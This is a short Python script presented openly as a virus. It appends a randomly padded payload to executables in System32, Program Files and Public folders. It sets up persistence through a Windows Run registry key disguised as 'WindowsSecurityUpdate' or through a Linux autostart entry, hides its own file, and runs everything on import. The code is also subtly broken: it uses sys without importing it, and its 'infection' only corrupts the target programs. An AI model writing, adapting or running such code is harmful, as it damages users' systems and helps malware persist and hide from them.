import os
import shutil
import random
import base64
import hashlib
import subprocess

VIRUS_NAME = "malware_payload.py"
TARGET_DIRECTORIES = [
    r"C:\\Windows\\System32", 
    r"C:\\Program Files",
    r"C:\\Users\\Public"
]

# ---- Polymorphic Payload ---- #
def mutate_payload(payload_path):
    with open(payload_path, "rb") as f:
        content = f.read()
    
    mutated_content = content + bytes(random.randint(0, 255) for _ in range(10))  # Append random bytes
    hash_digest = hashlib.sha256(mutated_content).hexdigest()
    mutated_path = f"{payload_path.split('.')[0]}_{hash_digest[:5]}.py"
    
    with open(mutated_path, "wb") as f:
        f.write(mutated_content)
    
    return mutated_path

# ---- Infect Executables ---- #
def infect_files():
    payload = mutate_payload(VIRUS_NAME)
    for directory in TARGET_DIRECTORIES:
        if os.path.exists(directory):
            files = [os.path.join(directory, f) for f in os.listdir(directory) if f.endswith(".exe")]
            selected_files = random.sample(files, min(3, len(files)))  # Infect up to 3 files per directory
            
            for file in selected_files:
                with open(file, "ab") as f:
                    with open(payload, "rb") as p:
                        f.write(p.read())  # Append the payload to the executable
                print(f"Virus infected: {file}")

# ---- Persistence ---- #
def establish_persistence():
    if os.name == "nt":  # Windows
        import winreg
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, sys.argv[0])
                print("Persistence established on Windows.")
        except Exception as e:
            print(f"Failed to establish persistence on Windows: {e}")
    else:  # Linux
        try:
            autostart_path = os.path.expanduser("~/.config/autostart/")
            os.makedirs(autostart_path, exist_ok=True)
            with open(os.path.join(autostart_path, "system_update.desktop"), "w") as f:
                f.write(f"[Desktop Entry]\nType=Application\nExec=python3 {sys.argv[0]}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n")
            print("Persistence established on Linux.")
        except Exception as e:
            print(f"Failed to establish persistence on Linux: {e}")

# ---- Stealth Execution ---- #
def hide_execution():
    if os.name == "nt":
        subprocess.call("attrib +h " + sys.argv[0], shell=True)  # Hide file in Windows

# ---- Run the Virus ---- #
def run_virus():
    payload = VIRUS_NAME
    os.system(f"python {payload}")
    hide_execution()

# Execute Virus Logic
infect_files()
establish_persistence()
run_virus()
